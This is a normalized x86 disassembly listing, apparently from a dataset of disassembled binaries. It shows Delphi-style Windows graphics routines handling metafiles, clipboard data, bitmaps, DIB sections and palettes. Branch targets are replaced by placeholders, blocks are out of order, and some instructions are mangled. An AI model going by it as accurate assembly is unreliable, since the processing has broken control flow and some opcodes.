mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax ebx
call sub_4156cc
sub eax 0x4
mov [ esp ] eax
cmp [ esi + 0x2c ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_42062c
mov edx ebx
mov eax esi
call sub_4205a0
jmp r-xdata
xor ecx ecx
mov edx [ esp ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub eax [ esp ]
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_4205a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026bc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42061c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_415930
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4026dc
retn
sub_42062c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x22 ]
xor ecx ecx
mov edx 0x16
call sub_402cac
mov ebx [ ebx + 0x28 ]
mov [ ebp - 0x22 ] 0x9ac6cdd7
mov ax [ ebx + 0x18 ]
test ax ax
jne r-xdata
mov [ ebp - 0x14 ] ax
mov [ ebp - 0x14 ] 0x60
jmp r-xdata
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax esi
call sub_415930
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_415930
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42074e
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4026dc
retn
call sub_41dad0
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call sub_406118
mov [ ebp - 0x18 ] ax
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call sub_406118
mov [ ebp - 0x16 ] ax
lea eax [ ebp - 0x22 ]
call sub_41e8c0
mov [ ebp - 0xe ] ax
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_420767
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
push 0x0
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_4026bc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_420747
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
cmp eax [ ebp - 0x8 ]
jae r-xdata
sub_420774
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx eax
push 0xe
call GetClipboardData
mov edi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_41ff14
mov esi [ ebx + 0x28 ]
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x64 ]
push eax
push 0x64
mov eax [ esi + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ esi + 0xc ] eax
mov eax [ ebp - 0x40 ]
sub eax [ ebp - 0x48 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x0
mov [ ebx + 0x2c ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_41da40
sub_4207f8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov [ edx ] 0xe
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
push 0x0
mov eax [ esi + 0x8 ]
push eax
call CopyEnhMetaFileA
mov [ edi ] eax
sub_4208c8
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_413de0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_420966
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42096d
mov eax [ rw-data ]
call sub_413e44
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_42093e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_420a58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_41d654
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_413a74
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_41d5f8
test al al
je r-xdata
sub_420974
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_413de0
mov esi eax
xor ecx ecx
push ebp
push sub_4209e4
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413e44
retn
mov edx ebx
mov eax esi
call sub_413a74
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_420a58
sub_4209f0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41d064
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_420a2c
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax esi
call sub_420a58
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41d128
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_420a58
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41d39c
xor edx edx
push ebp
push sub_420aec
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41d800
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_413df4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d654
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_420af8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41d39c
xor eax eax
push ebp
push sub_420bd7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_421e14
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_420974
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_421f14
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41d800
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_413d58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d654
retn
sub_420be8
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_403290
sub_420c08
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_420974
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40cdfc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_420c64
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_41b998
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_420974
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_420974
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_420cb0
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_41e30c
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_420d5f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_420d6c
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_420db8
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_420974
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_41db78
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_41db78
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_421406
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_4026bc
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_421110
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_41da58
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_41db78
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_41db78
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_41db78
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_41db78
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4213b7
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4213a6
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_421384
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_41db78
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_420d6c
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4028b8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_41e30c
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41cf48
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_412640
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c268
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41cf0c
call sub_41c268
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_41dad0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42138b
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_41db78
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_42135a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_41db78
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_4026dc
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c268
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41cf0c
call sub_41c268
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c268
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41cf0c
call sub_41c268
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_41db78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_403ac8
call sub_403ac8
jmp r-xdata
sub_4213ad
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_4213bc
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_403a44
call sub_403a98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_42141c
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_421480
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_420974
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_42167b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_41db78
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_41db78
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_41db78
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_421633
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_420db8
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
